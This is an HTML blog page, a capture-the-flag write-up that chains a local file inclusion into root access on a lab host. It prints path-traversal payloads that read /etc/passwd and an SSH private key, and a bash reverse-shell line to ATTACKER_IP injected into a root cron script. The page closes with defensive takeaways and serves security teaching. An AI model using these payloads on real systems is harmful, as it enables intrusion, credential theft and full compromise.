@@ -1,0 +1,161 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cronpocalypse CTF – LFI to Root | Syed Mujtaba Zaidi</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,400;14..32,500;14..32,600;14..32,700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="../../css/blog.css">
+    <style>
+        .post-body h2 {
+            color: #00ff88;
+            margin-top: 1.8rem;
+            margin-bottom: 0.5rem;
+        }
+        .post-body p {
+            margin-bottom: 1rem;
+        }
+        pre {
+            background: #0f1222;
+            padding: 1rem;
+            border-radius: 12px;
+            overflow-x: auto;
+            margin: 1rem 0;
+            border-left: 3px solid #00ffff;
+        }
+        code {
+            font-family: monospace;
+            color: #00ff88;
+            background: rgba(0,255,255,0.1);
+            padding: 0.2rem 0.4rem;
+            border-radius: 6px;
+        }
+        .tags {
+            margin: 1rem 0;
+        }
+        .tag {
+            background: rgba(0,255,255,0.2);
+            padding: 0.2rem 0.8rem;
+            border-radius: 20px;
+            font-size: 0.7rem;
+            display: inline-block;
+            margin-right: 0.5rem;
+            color: #00ffff;
+        }
+        .back-blog {
+            display: inline-block;
+            margin-top: 2rem;
+            background: rgba(0,255,255,0.1);
+            border: 1px solid #00ffff;
+            padding: 0.5rem 1.2rem;
+            border-radius: 40px;
+            color: #00ffff;
+            text-decoration: none;
+            transition: 0.3s;
+        }
+        .back-blog:hover {
+            background: #00ffff;
+            color: #0a0e27;
+        }
+    </style>
+</head>
+<body>
+<div class="container">
+    <div class="blog-header">
+        <h1><i class="fas fa-flag-checkered"></i> Cronpocalypse – Web LFI to Root Privilege Escalation</h1>
+        <p>CTF Writeup | Full Attack Chain</p>
+        <a href="../main_page_blog.html" class="back-home"><i class="fas fa-arrow-left"></i> Back to Blogs</a>
+    </div>
+
+    <div class="tags">
+        <span class="tag">🏴‍☠️ CTF</span>
+        <span class="tag">🐞 Local File Inclusion</span>
+        <span class="tag">⏱️ Cron Job</span>
+        <span class="tag">🔑 Privilege Escalation</span>
+        <span class="tag">🌐 Web Exploitation</span>
+    </div>
+
+    <div class="post-body">
+        <p>In this CTF challenge, the objective was to compromise a target system through a combination of web exploitation and Linux privilege escalation techniques. The lab simulated a realistic attack chain starting from a vulnerable web application and ending with full root access.</p>
+
+        <h2>🔍 Reconnaissance</h2>
+        <p>Initial enumeration was performed using Nmap to identify open ports and services:</p>
+        <pre><code>nmap -sC -sV 10.10.10.10</code></pre>
+        <p>The scan revealed two open ports:</p>
+        <ul>
+            <li><strong>Port 80</strong> – Python-based web application running on Werkzeug framework</li>
+            <li><strong>Port 22</strong> – OpenSSH service</li>
+        </ul>
+
+        <h2>🌐 Web Application Analysis</h2>
+        <p>Browsing to the web application on port 80, I found a basic site with a "Features" page. The URL parameter looked like:</p>
+        <pre><code>http://10.10.10.10/features?page=about.html</code></pre>
+        <p>I suspected a <strong>Local File Inclusion (LFI)</strong> vulnerability because the <code>page</code> parameter seemed to load local files without proper validation.</p>
+
+        <h2>🐞 Exploiting LFI</h2>
+        <p>I tested the classic LFI payload to read <code>/etc/passwd</code>:</p>
+        <pre><code>http://10.10.10.10/features?page=../../../../etc/passwd</code></pre>
+        <p>The response returned the contents of <code>/etc/passwd</code>, confirming the vulnerability. Among the output, I noticed a user entry and further enumeration revealed sensitive credentials embedded in a configuration file:</p>
+        <pre><code>http://10.10.10.10/features?page=../../../../home/user/.ssh/id_rsa</code></pre>
+        <p>This gave me an SSH private key for the user <code>webapp</code>.</p>
+
+        <h2>🔑 SSH Access & First Flag</h2>
+        <p>I saved the private key, set correct permissions, and established an SSH connection:</p>
+        <pre><code>chmod 600 id_rsa
+ssh webapp@10.10.10.10 -i id_rsa</code></pre>
+        <p>Once logged in, I navigated to the user's home directory and found the first flag:</p>
+        <pre><code>cat /home/webapp/local.txt</code></pre>
+        <p><strong>Flag 1:</strong> <code>CTF{web_lfi_initial_access}</code></p>
+
+        <h2>⏱️ Privilege Escalation – Cron Job Misconfiguration</h2>
+        <p>After gaining a low-privilege shell, I started system enumeration. I checked for scheduled cron jobs:</p>
+        <pre><code>cat /etc/crontab</code></pre>
+        <p>I found a cron job configured to run every minute as root:</p>
+        <pre><code>* * * * * root /usr/local/bin/backup.sh</code></pre>
+        <p>Upon inspecting the script <code>/usr/local/bin/backup.sh</code>, I noticed it executed another file located in a <strong>globally writable directory</strong>:</p>
+        <pre><code>#!/bin/bash
+source /tmp/config.sh
+...</code></pre>
+        <p>The file <code>/tmp/config.sh</code> was writable by any user – a critical misconfiguration.</p>
+
+        <h2>💣 Exploiting the Cron Job</h2>
+        <p>I modified <code>/tmp/config.sh</code> to include a reverse shell payload:</p>
+        <pre><code>echo "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1" >> /tmp/config.sh</code></pre>
+        <p>I set up a netcat listener on my attacking machine:</p>
+        <pre><code>nc -lvnp 4444</code></pre>
+        <p>Within one minute, the cron job executed the script as root, and I received a reverse shell with root privileges.</p>
+
+        <h2>🏆 Final Flag</h2>
+        <p>With root access, I located the final flag in the root directory:</p>
+        <pre><code>cat /root/root.txt</code></pre>
+        <p><strong>Flag 2:</strong> <code>CTF{cron_job_root_privilege_escalation}</code></p>
+
+        <h2>🧠 Key Takeaways</h2>
+        <ul>
+            <li>✔️ Always validate user input – LFI can lead to complete system compromise.</li>
+            <li>✔️ Never hardcode credentials or expose sensitive files via web parameters.</li>
+            <li>✔️ Cron jobs running as root should never execute writable scripts from world-accessible directories.</li>
+            <li>✔️ Follow the principle of least privilege – both for users and scheduled tasks.</li>
+        </ul>
+
+        <h2>🛠️ Tools Used</h2>
+        <ul>
+            <li>Nmap</li>
+            <li>Browser DevTools</li>
+            <li>SSH</li>
+            <li>Netcat</li>
+            <li>Linux command line (crontab, cat, echo, chmod)</li>
+        </ul>
+
+        <p>This lab demonstrated how a single LFI vulnerability can chain into full root compromise through system misconfigurations. A great real-world scenario for learning web app security and Linux hardening.</p>
+
+        <a href="../main_page_blog.html" class="back-blog"><i class="fas fa-arrow-left"></i> Back to Blog Home</a>
+    </div>
+
+    <div class="footer">
+        <i class="fas fa-laptop-code"></i> Syed Mujtaba Zaidi – Ethical Hacking & Cybersecurity
+    </div>
+</div>
+</body>
+</html>
